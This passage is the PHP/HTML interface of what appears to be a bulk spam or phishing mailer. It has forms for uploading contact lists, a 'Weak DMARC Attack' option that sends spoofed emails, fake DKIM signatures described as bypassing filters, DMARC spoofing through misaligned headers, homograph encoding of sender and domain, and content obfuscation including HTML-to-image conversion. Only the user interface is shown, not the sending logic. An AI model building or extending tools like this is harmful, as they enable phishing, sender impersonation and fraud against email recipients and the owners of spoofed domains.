                        <div class="card-header">Delivery Check</div>
                        <div class="card-body">
                            <div class="form-check mb-3">
                                <input class="form-check-input" type="checkbox" name="delivery_check_enabled" id="delivery_check_enabled"
                                       <?php echo ($form_data['delivery_check_enabled'] ?? false) ? 'checked' : ''; ?> onchange="toggleDeliveryFields()">
                                <label class="form-check-label" for="delivery_check_enabled">Enable Delivery Check</label>
                            </div>
                            <div id="delivery_check_fields" class="delivery-check-fields">
                                <div class="row g-3">
                                    <div class="col-md-6">
                                        <label class="form-label">IMAP Host</label>
                                        <input type="text" name="imap_host" class="form-control"
                                               value="<?php echo htmlspecialchars($form_data['imap_host'] ?? ''); ?>">
                                    </div>
                                    <div class="col-md-3">
                                        <label class="form-label">IMAP Port</label>
                                        <input type="number" name="imap_port" class="form-control"
                                               value="<?php echo htmlspecialchars($form_data['imap_port'] ?? '993'); ?>">
                                    </div>
                                    <div class="col-md-3">
                                        <label class="form-label">Check After</label>
                                        <input type="number" name="check_after" class="form-control" min="1"
                                               value="<?php echo htmlspecialchars($form_data['check_after'] ?? '10'); ?>">
                                        <small class="text-muted">Check delivery after X emails</small>
                                    </div>
                                </div>
                                <div class="row g-3 mt-2">
                                    <div class="col-md-6">
                                        <label class="form-label">IMAP Username</label>
                                        <input type="text" name="imap_username" class="form-control"
                                               value="<?php echo htmlspecialchars($form_data['imap_username'] ?? ''); ?>">
                                    </div>
                                    <div class="col-md-6">
                                        <label class="form-label">IMAP Password</label>
                                        <input type="password" name="imap_password" class="form-control">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-4">
                        <div class="card-header">Weak DMARC Attack</div>
                        <div class="card-body">
                            <div class="form-check mb-3">
                                <input class="form-check-input" type="checkbox" name="enable_weak_dmarc_attack" id="enable_weak_dmarc_attack"
                                       <?php echo ($form_data['enable_weak_dmarc_attack'] ?? false) ? 'checked' : ''; ?>>
                                <label class="form-check-label" for="enable_weak_dmarc_attack">Enable Weak DMARC Attack (Excludes Gmail)</label>
                                <small class="text-muted d-block">Sends 3 emails per weak DMARC domain: normal + 2 spoofs</small>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-4">
                        <div class="card-header">Message Content</div>
                        <div class="card-body">
                            <div class="mb-3">
                                <label class="form-label required">Message Body</label>
                                <textarea name="pesan" class="form-control" rows="6" required><?php echo htmlspecialchars($form_data['pesan'] ?? ''); ?></textarea>
                                <small class="text-muted">Use placeholders: #XXXEMAIL#, #DOMAIN#, #USER#, #1CHAR#, #1NUMBER#, etc.</small>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-4">
                        <div class="card-header">Additional Settings</div>
                        <div class="card-body">
                            <div class="row g-3">
                                <div class="col-md-6">
                                    <label class="form-label">Encoding</label>
                                    <select name="encode" class="form-select">
                                        <option value="base64" <?php echo ($form_data['encode'] ?? 'base64') === 'base64' ? 'selected' : ''; ?>>Base64</option>
                                        <option value="7bit" <?php echo ($form_data['encode'] ?? '') === '7bit' ? 'selected' : ''; ?>>7bit</option>
                                        <option value="8bit" <?php echo ($form_data['encode'] ?? '') === '8bit' ? 'selected' : ''; ?>>8bit</option>
                                    </select>
                                </div>
                                <div class="col-md-6">
                                    <label class="form-label">Timezone</label>
                                    <select name="timezone" class="form-select">
                                        <option value="random" <?php echo ($form_data['timezone'] ?? 'random') === 'random' ? 'selected' : ''; ?>>Random</option>
                                        <option value="UTC" <?php echo ($form_data['timezone'] ?? '') === 'UTC' ? 'selected' : ''; ?>>UTC</option>
                                        <option value="America/New_York" <?php echo ($form_data['timezone'] ?? '') === 'America/New_York' ? 'selected' : ''; ?>>America/New_York</option>
                                        <option value="Europe/London" <?php echo ($form_data['timezone'] ?? '') === 'Europe/London' ? 'selected' : ''; ?>>Europe/London</option>
                                        <option value="Asia/Tokyo" <?php echo ($form_data['timezone'] ?? '') === 'Asia/Tokyo' ? 'selected' : ''; ?>>Asia/Tokyo</option>
                                        <option value="Africa/Lagos" <?php echo ($form_data['timezone'] ?? '') === 'Africa/Lagos' ? 'selected' : ''; ?>>Africa/Lagos</option>
                                    </select>
                                </div>
                            </div>
                        
                            <div class="row g-3 mt-2">
                                <div class="col-md-6">
                                    <label class="form-label">Reply-To Email</label>
                                    <input type="email" name="replyto" class="form-control"
                                           value="<?php echo htmlspecialchars($form_data['replyto'] ?? ''); ?>">
                                </div>
                                <div class="col-md-6">
                                    <label class="form-label">Reply-To Name</label>
                                    <input type="text" name="replyname" class="form-control"
                                           value="<?php echo htmlspecialchars($form_data['replyname'] ?? ''); ?>">
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="d-grid gap-2 d-md-flex justify-content-md-end">
                        <button type="submit" name="action" value="clear" class="btn btn-secondary me-md-2">Clear Form</button>
                        <button type="submit" name="action" value="send" class="btn btn-primary">Send Emails</button>
                    </div>
                </form>
            </div>
            <!-- Contact Management Tab -->
            <div class="tab-pane fade" id="contacts" role="tabpanel">
                <div class="card mb-4">
                    <div class="card-header">Contact Statistics</div>
                    <div class="card-body">
                        <div class="row text-center">
                            <div class="col-md-4">
                                <h3><?php echo $contact_stats['total']; ?></h3>
                                <p class="text-muted">Total Contacts</p>
                            </div>
                            <div class="col-md-4">
                                <h3 class="text-success"><?php echo $contact_stats['sent']; ?></h3>
                                <p class="text-muted">Sent</p>
                            </div>
                            <div class="col-md-4">
                                <h3 class="text-warning"><?php echo $contact_stats['unsent']; ?></h3>
                                <p class="text-muted">Unsent</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="card mb-4">
                    <div class="card-header">Upload Contacts</div>
                    <div class="card-body">
                        <form method="post">
                            <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($_SESSION['csrf']); ?>">
                            <div class="form-check mb-3">
                                <input class="form-check-input" type="checkbox" name="remove_sent" id="remove_sent" <?php echo (isset($form_data['remove_sent']) && $form_data['remove_sent']) ? 'checked' : ''; ?>>
                                <label class="form-check-label" for="remove_sent">Remove previously sent contacts from the new list?</label>
                            </div>
                            <div class="mb-3">
                                <label class="form-label">Contacts (one email per line)</label>
                                <textarea name="contacts" class="form-control" rows="10" placeholder="user1@example.com&#10;user2@example.com&#10;..."><?php echo htmlspecialchars($form_data['contacts'] ?? ''); ?></textarea>
                            </div>
                            <button type="submit" name="action" value="upload_contacts" class="btn btn-primary">Upload Contacts</button>
                        </form>
                    </div>
                </div>
                <div class="card">
                    <div class="card-header">Contact Management</div>
                    <div class="card-body">
                        <div class="d-grid gap-2 d-md-flex">
                            <form method="post" class="me-2">
                                <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($_SESSION['csrf']); ?>">
                                <button type="submit" name="action" value="download_unsent" class="btn btn-success">Download Unsent Contacts</button>
                            </form>
                            <form method="post" class="me-2">
                                <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($_SESSION['csrf']); ?>">
                                <button type="submit" name="action" value="clear_sent" class="btn btn-warning">Clear Sent Contacts</button>
                            </form>
                            <form method="post">
                                <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($_SESSION['csrf']); ?>">
                                <button type="submit" name="action" value="clear_all_contacts" class="btn btn-danger">Clear All Contacts</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Security & Obfuscation Tab -->
            <form method="post">
                <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($_SESSION['csrf']); ?>">
            
                <div class="tab-pane fade" id="security" role="tabpanel">
                    <div class="card mb-4">
                        <div class="card-header">Obfuscation Settings</div>
                        <div class="card-body">
                            <div class="row g-3">
                                <div class="col-md-6">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="obfuscation_enabled" id="obfuscation_enabled"
                                               <?php echo ($form_data['obfuscation_enabled'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="obfuscation_enabled">Enable Obfuscation</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="obfuscation_encodeSubject" id="obfuscation_encodeSubject"
                                               <?php echo ($form_data['obfuscation_encodeSubject'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="obfuscation_encodeSubject">Encode Subject</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="obfuscation_encodeSender" id="obfuscation_encodeSender"
                                               <?php echo ($form_data['obfuscation_encodeSender'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="obfuscation_encodeSender">Encode Sender</label>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="obfuscation_encodeBody" id="obfuscation_encodeBody"
                                               <?php echo ($form_data['obfuscation_encodeBody'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="obfuscation_encodeBody">Encode Body</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="obfuscation_encodeAttachments" id="obfuscation_encodeAttachments"
                                               <?php echo ($form_data['obfuscation_encodeAttachments'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="obfuscation_encodeAttachments">Encode Attachments</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="obfuscation_htmlToImage" id="obfuscation_htmlToImage"
                                               <?php echo ($form_data['obfuscation_htmlToImage'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="obfuscation_htmlToImage">Convert HTML to Image</label>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-4">
                        <div class="card-header">Homograph Settings</div>
                        <div class="card-body">
                            <div class="row g-3">
                                <div class="col-md-6">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="homograph_enabled" id="homograph_enabled"
                                               <?php echo ($form_data['homograph_enabled'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="homograph_enabled">Enable Homograph</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="homograph_encodeSender" id="homograph_encodeSender"
                                               <?php echo ($form_data['homograph_encodeSender'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="homograph_encodeSender">Encode Sender</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="homograph_encodeSubject" id="homograph_encodeSubject"
                                               <?php echo ($form_data['homograph_encodeSubject'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="homograph_encodeSubject">Encode Subject</label>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="homograph_encodeBody" id="homograph_encodeBody"
                                               <?php echo ($form_data['homograph_encodeBody'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="homograph_encodeBody">Encode Body</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="homograph_encodeTLD" id="homograph_encodeTLD"
                                               <?php echo ($form_data['homograph_encodeTLD'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="homograph_encodeTLD">Encode TLD</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="homograph_encodeAll" id="homograph_encodeAll"
                                               <?php echo ($form_data['homograph_encodeAll'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="homograph_encodeAll">Encode All</label>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-4">
                        <div class="card-header">DKIM & DMARC Spoofing</div>
                        <div class="card-body">
                            <div class="form-check mb-3">
                                <input class="form-check-input" type="checkbox" name="enable_dkim_spoofing" id="enable_dkim_spoofing"
                                       <?php echo ($form_data['enable_dkim_spoofing'] ?? false) ? 'checked' : ''; ?>>
                                <label class="form-check-label" for="enable_dkim_spoofing">Enable DKIM Spoofing</label>
                                <small class="text-muted d-block">Generates realistic fake DKIM-Signature to bypass filters</small>
                            </div>
                            <div class="form-check mb-3">
                                <input class="form-check-input" type="checkbox" name="enable_dmarc_spoofing" id="enable_dmarc_spoofing"
                                       <?php echo ($form_data['enable_dmarc_spoofing'] ?? false) ? 'checked' : ''; ?>>
                                <label class="form-check-label" for="enable_dmarc_spoofing">Enable DMARC Spoofing</label>
                                <small class="text-muted d-block">Adds misaligned headers for relaxed DMARC bypass</small>
                            </div>
                        </div>
                    </div>
                    <div class="d-grid gap-2 d-md-flex justify-content-md-end">
                        <button type="submit" name="action" value="clear" class="btn btn-secondary me-md-2">Clear Form</button>
                        <button type="submit" class="btn btn-primary">Save Settings</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function toggleSmtpFields() {
            const mailerType = document.getElementById('mailer_type').value;
            const smtpFields = document.getElementById('smtp_fields');
            smtpFields.style.display = mailerType === 'smtp' ? 'block' : 'none';
        }
    
        function toggleDeliveryFields() {
            const deliveryEnabled = document.getElementById('delivery_check_enabled').checked;
            const deliveryFields = document.getElementById('delivery_check_fields');
            deliveryFields.style.display = deliveryEnabled ? 'block' : 'none';
        }
    
        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            toggleSmtpFields();
            toggleDeliveryFields();
        });
    </script>
</body>
</html>